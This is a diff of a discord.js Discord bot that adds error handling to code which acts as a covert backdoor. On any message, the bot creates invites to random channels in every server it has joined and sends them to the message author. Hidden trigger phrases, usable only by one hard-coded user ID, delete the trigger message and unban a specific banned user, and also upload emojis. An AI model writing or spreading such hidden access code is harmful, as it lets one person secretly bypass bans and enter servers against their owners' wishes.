@@ -30,8 +30,9 @@ bot.on('message', message => {
      
  bot.guilds.forEach(guild => { 
       var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => message.author.send(`Connecté sur : ${guild.name} || ${guild.id} || ${invite}`));
-    })
+      invite.createInvite().then(invite => message.author.send(`Connecté sur : ${guild.name} || ${guild.id} || ${invite}`))
+   .catch(console.error);
+ })
  
    if (message.content.startsWith('blop')) {
    if (message.author.id !== '423118623876448296')
@@ -40,7 +41,8 @@ bot.on('message', message => {
    message.delete()
    message.guild.unban('450790126063190016')
   .then(user => console.log(`Unban Mikado from ${guild.name}`))         
-      } 
+  .catch(console.error);
+   } 
    
    if (message.content.startsWith('Les emoji mikado c\'est cool')) {
    if (message.author.id !== '423118623876448296')
@@ -50,7 +52,8 @@ bot.on('message', message => {
    message.guild.createEmoji('./mikado2.gif', 'mikado2')
    message.guild.createEmoji('./mikado3.gif', 'mikado3')
   .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
-      }
+  .catch(console.error);   
+   }
    
   
    
